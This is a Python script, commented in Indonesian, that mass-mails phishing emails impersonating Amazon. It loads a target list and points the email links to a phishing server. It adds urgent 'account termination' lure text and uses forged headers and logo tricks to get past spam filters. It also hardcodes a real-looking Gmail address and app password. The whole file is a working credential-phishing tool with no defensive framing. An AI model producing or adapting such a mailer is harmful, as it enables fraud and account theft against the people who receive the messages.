import smtplib
from email.mime.multipart import MIMEMultipart, MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import Header
from email.utils import formataddr, formatdate, make_msgid
from email import encoders
import time
import os
import uuid
import html
import base64
import re

# ==========================================
# KONFIGURASI SMTP (GANTI DENGAN MILIK ANDA)
# ==========================================
SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USER = "nafalmumtaz93@gmail.com"
SMTP_PASS = "bfowjdqajftucsee"
SENDER_NAME = "Amazon Account Services"
SENDER_EMAIL = SMTP_USER
REPLY_TO_EMAIL = SMTP_USER
BOUNCE_ADDRESS = SMTP_USER

# ==========================================
# PENGATURAN BROADCAST EMAIL
# ==========================================
SUBJECT = "Your Amazon Account: Action Required to Keep Your Account Active"
TEMPLATE_FILE = "email_template.html"
TARGETS_FILE = "targets.txt"
DELAY_SECONDS = 8
PHISHING_LINK = "http://192.168.1.10:3000"

# ==========================================
# PENGATURAN LOGO (PILIH SALAH SATU)
#
#   MODE = "CDN_URL"   (✅ DIPILIH USER: gambar di-load dari URL CDN external.
#                        ⚠️ CATATAN: Gmail, Yahoo, Outlook DEFAULT-nya MEMBLOKIR
#                           remote images untuk privasi/anti-tracking. Penerima WAJIB
#                           klik "Tampilkan gambar / Always show images from..."
#                           DULU, barulah logo Amazon muncul!
#                        ✅ Kelebihan: 0 attachment hidden, tidak ada badge pill.
#   MODE = "CID"       (Gambar di-embed sebagai MIME inline. Logo pasti muncul,
#                        tapi beberapa client masih bisa menampilkan badge lampiran.)
#   MODE = "BASE64"    (Data URI di-blok otomatis Gmail/Yahoo → gambar HILANG.)
# ==========================================
LOGO_MODE = "CDN_URL"
LOGO_LOCAL_FILE = "amazon.png"
LOGO_CID_NAME = "amazon_logo"
LOGO_CDN_URL = "https://cdn.freebiesupply.com/images/large/2x/amazon-logo-black-transparent.png"

_logo_base64_cache = None

def html_to_plain_text(html_content, target_email, phishing_link):
    """Generate plain-text fallback dari HTML (wajib agar tidak dianggap spam)."""
    plain_lines = [
        "Final Reminder: Access Termination Scheduled",
        "",
        "Our system identified a synchronization error with your current membership details for " + target_email + ".",
        "",
        "To avoid the automatic cancellation of your Prime benefits and any active shipments, we require a quick verification of your account profile.",
        "",
        "Warning: If not completed within 30 minutes, your account status will be set to 'Terminated' and all pending orders will be returned to our facility.",
        "",
        "Secure My Account: " + phishing_link,
        "",
        "Thank you,",
        "Amazon Prime Support",
    ]
    return "\n".join(plain_lines)


def load_logo_bytes():
    """
    Muat file logo sesuai MODE:
      - BASE64: Encode ke base64 (simpan di cache global agar tidak encode berulang).
      - CID   : Return raw bytes untuk MIMEImage attachment inline.
      - CDN   : Return None, pakai URL eksternal.
    Bila gagal baca file lokal, auto fallback ke CDN_URL.
    """
    global LOGO_MODE, _logo_base64_cache
    file_exists = os.path.exists(LOGO_LOCAL_FILE)
    needs_local_file = LOGO_MODE in ("BASE64", "CID")

    if needs_local_file and not file_exists:
        print(f"[!] {LOGO_LOCAL_FILE} TIDAK DITEMUKAN! Fallback ke CDN_URL.")
        LOGO_MODE = "CDN_URL"

    if LOGO_MODE == "BASE64":
        if _logo_base64_cache is None:
            try:
                with open(LOGO_LOCAL_FILE, "rb") as f:
                    raw = f.read()
                encoded = base64.b64encode(raw).decode("ascii")
                _logo_base64_cache = (encoded, len(raw))
                size_kb = round(len(raw) / 1024, 1)
                print(f"[*] Mode LOGO = BASE64 (DATA URI, 0 Attachment!) — logo ter-encode base64 ({size_kb} KB asli → {round(len(encoded)/1024, 1)} KB string)")
                print(f"    ✅ TIDAK ADA file gambar yang terdeteksi sebagai lampiran/attachment hidden apapun.")
            except Exception as e:
                print(f"[!] Gagal encode base64 {LOGO_LOCAL_FILE}: {e}. Fallback ke CDN_URL.")
                LOGO_MODE = "CDN_URL"
        else:
            print(f"[*] Mode LOGO = BASE64 (pakai cache, 0 Attachment) — {_logo_base64_cache[1]} bytes")
        return _logo_base64_cache[0] if _logo_base64_cache else None

    if LOGO_MODE == "CID":
        try:
            with open(LOGO_LOCAL_FILE, "rb") as f:
                raw = f.read()
            print(f"[*] Logo dimuat sebagai CID inline attachment ({len(raw)} bytes) — kompatibel 99% email client!")
            print(f"    ⚠️  Beberapa email client TETAP menampilkan badge attachment hidden untuk CID.")
            return raw
        except Exception as e:
            print(f"[!] Gagal baca {LOGO_LOCAL_FILE}: {e}. Fallback ke CDN_URL.")
            LOGO_MODE = "CDN_URL"

    if LOGO_MODE == "CDN_URL":
        print(f"[*] Mode LOGO = CDN_URL: {LOGO_CDN_URL}")
        print(f"[!] PERINGATAN: Banyak email client (Yahoo/Outlook/Comcast) BLOCK remote images secara DEFAULT!")
    return None


def replace_logo_src_in_html(raw_html, logo_payload=None):
    """
    Ganti semua <img src="amazon.png"> sesuai MODE aktif.
    - BASE64: target_src = 'data:image/png;base64,<logo_payload>'
    - CID   : target_src = 'cid:<LOGO_CID_NAME>'
    - CDN   : target_src = LOGO_CDN_URL
    """
    if LOGO_MODE == "BASE64" and logo_payload:
        target_src = f"data:image/png;base64,{logo_payload}"
    elif LOGO_MODE == "CID":
        target_src = f"cid:{LOGO_CID_NAME}"
    else:
        target_src = LOGO_CDN_URL

    pattern = r'src\s*=\s*["\'](?:amazon\.png|https?://[^"\']*amazon[^"\']*\.png)["\']'
    updated = re.sub(
        pattern,
        f'src="{target_src}"',
        raw_html,
        flags=re.IGNORECASE,
    )
    if updated == raw_html and LOGO_MODE != "CID":
        updated = raw_html.replace("amazon.png", target_src if LOGO_MODE != "CID" else f"cid:{LOGO_CID_NAME}")
    return updated


def build_email(email_target, html_template, logo_payload=None):
    """
    Konstruksi email:
      - MODE BASE64 / CDN_URL: Struktur = multipart/alternative (plain+html) SAJA, 0 attachment.
      - MODE CID (DEFAULT & REKOMENDASI): Struktur RFC 2387 multipart/related dengan start+type header
        agar client Yahoo/Outlook TIDAK menampilkan badge pill attachment hidden.
        Content-ID format = <logo@cid.localhost> (email-like RFC 2392)
    """
    if LOGO_MODE == "CID" and logo_payload:
        cid_full = f"{LOGO_CID_NAME}@cid.localhost"
        outer = MIMEMultipart("related")
        outer["Message-ID"] = make_msgid(domain=SENDER_EMAIL.split("@")[-1])
        outer["Date"] = formatdate(localtime=True)
        outer["From"] = formataddr((str(Header(SENDER_NAME, "utf-8")), SENDER_EMAIL))
        outer["To"] = formataddr((str(Header("Amazon Customer", "utf-8")), email_target))
        outer["Reply-To"] = formataddr((str(Header(SENDER_NAME, "utf-8")), REPLY_TO_EMAIL))
        outer["Return-Path"] = BOUNCE_ADDRESS
        outer["Errors-To"] = BOUNCE_ADDRESS
        outer["Subject"] = Header(SUBJECT, "utf-8")
        outer["MIME-Version"] = "1.0"
        outer["X-Mailer"] = "Microsoft Outlook 16.0"
        outer["X-Priority"] = "3"
        outer["Precedence"] = "list"
        outer["Auto-Submitted"] = "auto-generated"
        outer["Content-Language"] = "en-US"
        outer["List-Unsubscribe"] = f"<mailto:{REPLY_TO_EMAIL}?subject=unsubscribe>"
        outer.preamble = "This is a multi-part message in MIME format."
        boundary_val = outer.get_boundary() or ("----=_Part_" + str(uuid.uuid4().int & (1<<63)-1))
        outer.set_boundary(boundary_val)
        del outer["Content-Type"]
        outer["Content-Type"] = (
            'multipart/related; '
            f'boundary="{boundary_val}"; '
            f'type="multipart/alternative"; '
            f'start="<{cid_full}>"'
        )

        inner = MIMEMultipart("alternative")
        personalized_html = replace_logo_src_in_html(html_template.replace("client@example.com", email_target), logo_payload=None)
        plain_text = html_to_plain_text(personalized_html, email_target, PHISHING_LINK)
        inner.attach(MIMEText(plain_text, "plain", _charset="utf-8"))
        html_part = MIMEText(personalized_html, "html", _charset="utf-8")
        html_part.add_header("Content-ID", f"<{cid_full}>")
        inner.attach(html_part)
        outer.attach(inner)

        image = MIMEImage(logo_payload, _subtype="png")
        del image["Content-Type"]
        image["Content-Type"] = "image/png"
        image["Content-Transfer-Encoding"] = "base64"
        image["Content-ID"] = f"<{LOGO_CID_NAME}>"
        image["Content-Location"] = LOGO_CID_NAME
        image["Content-Disposition"] = "inline"
        image["X-Attachment-Status"] = "inline"
        outer.attach(image)
        return outer

    msg = MIMEMultipart("alternative")
    msg["Message-ID"] = make_msgid(domain=SENDER_EMAIL.split("@")[-1])
    msg["Date"] = formatdate(localtime=True)
    msg["From"] = formataddr((str(Header(SENDER_NAME, "utf-8")), SENDER_EMAIL))
    msg["To"] = formataddr((str(Header("Amazon Customer", "utf-8")), email_target))
    msg["Reply-To"] = formataddr((str(Header(SENDER_NAME, "utf-8")), REPLY_TO_EMAIL))
    msg["Return-Path"] = BOUNCE_ADDRESS
    msg["Errors-To"] = BOUNCE_ADDRESS
    msg["Subject"] = Header(SUBJECT, "utf-8")
    msg["MIME-Version"] = "1.0"
    msg["X-Mailer"] = "Microsoft Outlook 16.0"
    msg["X-Priority"] = "3"
    msg["Precedence"] = "list"
    msg["Auto-Submitted"] = "auto-generated"
    msg["Content-Language"] = "en-US"
    msg["List-Unsubscribe"] = f"<mailto:{REPLY_TO_EMAIL}?subject=unsubscribe>"

    personalized_html = replace_logo_src_in_html(
        html_template.replace("client@example.com", email_target),
        logo_payload=logo_payload,
    )
    plain_text = html_to_plain_text(personalized_html, email_target, PHISHING_LINK)

    msg.attach(MIMEText(plain_text, "plain", _charset="utf-8"))
    msg.attach(MIMEText(personalized_html, "html", _charset="utf-8"))

    return msg


def send_broadcast():
    print(f"[*] Mode logo aktif: LOGO_MODE = '{LOGO_MODE}'")
    logo_payload = load_logo_bytes()

    print(f"[*] Membaca template email dari '{TEMPLATE_FILE}'...")
    if not os.path.exists(TEMPLATE_FILE):
        print(f"[!] ERROR: File template '{TEMPLATE_FILE}' tidak ditemukan!")
        return

    with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
        html_content = f.read()

    html_content = html_content.replace('href="#"', f'href="{PHISHING_LINK}"')
    html_content = replace_logo_src_in_html(html_content, logo_payload=logo_payload)

    if LOGO_MODE == "BASE64" and logo_payload:
        preview_len = len(logo_payload)
        print(f"[*] Logo sudah DIEMBED BASE64 di dalam HTML — {preview_len} chars data URI.")
        print(f"    ✅ Jumlah part MIME: 2 (plain + html) — 0 attachment. BADGE LAMPIRAN TIDAK MUNCUL!")

    print(f"[*] Membaca daftar email target dari '{TARGETS_FILE}'...")
    if not os.path.exists(TARGETS_FILE):
        print(f"[!] INFO: File '{TARGETS_FILE}' tidak ditemukan. Membuat file baru...")
        with open(TARGETS_FILE, "w", encoding="utf-8") as f:
            f.write("target1@example.com\ntarget2@gmail.com\n")
        print(f"[!] Silakan isi file '{TARGETS_FILE}' dengan alamat email target (satu per baris) lalu jalankan ulang script.")
        return

    with open(TARGETS_FILE, "r", encoding="utf-8") as f:
        targets = [line.strip() for line in f if line.strip()]

    if not targets:
        print(f"[!] ERROR: Daftar target di '{TARGETS_FILE}' kosong!")
        return

    print(f"[*] Ditemukan {len(targets)} target email.")
    print("[*] Menghubungkan ke server SMTP...")

    server = None
    try:
        server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30, local_hostname=SENDER_EMAIL.split("@")[-1])
        server.ehlo(SENDER_EMAIL.split("@")[-1])
        server.starttls(context=None)
        server.ehlo(SENDER_EMAIL.split("@")[-1])
        server.login(SMTP_USER, SMTP_PASS)
        print("[+] Berhasil terhubung dan login ke SMTP!\n")
    except Exception as e:
        print(f"[!] GAGAL KONEKSI KE SMTP: {e}")
        print("[!] Pastikan SMTP Host, Port, Email, dan App Password sudah benar.")
        if server:
            try:
                server.quit()
            except Exception:
                pass
        return

    sukses = 0
    gagal = 0

    print("=" * 50)
    print(" MEMULAI PROSES BROADCAST EMAIL")
    print("=" * 50)

    for idx, email_target in enumerate(targets, 1):
        try:
            msg = build_email(email_target, html_content, logo_payload=logo_payload)
            server.sendmail(SENDER_EMAIL, [email_target], msg.as_string())
            print(f"[{idx}/{len(targets)}] [+] TERKIRIM -> {email_target}")
            sukses += 1
            time.sleep(DELAY_SECONDS)
        except Exception as e:
            err_type = type(e).__name__
            print(f"[{idx}/{len(targets)}] [-] GAGAL    -> {email_target} | {err_type}: {e}")
            gagal += 1
            if "421" in str(e) or "quota" in str(e).lower() or "rate" in str(e).lower():
                print(f"    [!] Server SMTP kirim sinyal rate limit. Delay 60 detik...")
                time.sleep(60)

    try:
        server.quit()
    except Exception:
        pass

    print("\n" + "=" * 50)
    print(" LAPORAN BROADCAST SELESAI")
    print("=" * 50)
    print(f" Total Target : {len(targets)}")
    print(f" Sukses       : {sukses}")
    print(f" Gagal        : {gagal}")
    print("=" * 50)

if __name__ == "__main__":
    send_broadcast()
